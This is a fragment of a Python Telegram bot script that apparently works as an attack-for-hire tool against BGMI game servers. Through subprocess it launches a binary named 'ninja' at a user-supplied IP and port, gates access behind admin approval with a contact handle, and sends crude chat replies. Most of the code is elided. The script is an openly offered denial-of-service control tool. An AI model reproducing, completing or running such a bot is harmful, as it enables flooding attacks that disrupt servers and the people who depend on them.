...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./ninja", target_ip, str(target_port), "1", "30"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED DM @TMZEROO FOR APPROVAL*", parse_mode='Markdown')
...
def send_main_buttons(chat_id):
    ...
    bot.send_message(chat_id, "*Choose an action:To Fuck BGMI *", reply_markup=markup, parse_mode='Markdown')
...
def disapprove_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*.Please contact to admin :- @TMZEROO", parse_mode='Markdown')
        return
    ...
    try:
        ...
        bot.send_message(message.chat.id, "*Sahi Se karo Be*", parse_mode='Markdown')
...
def process_attack_ip_port(message):
    try:
        ...
        bot.send_message(message.chat.id, "*shi se add kro na ADMIN JI*", parse_mode='Markdown')
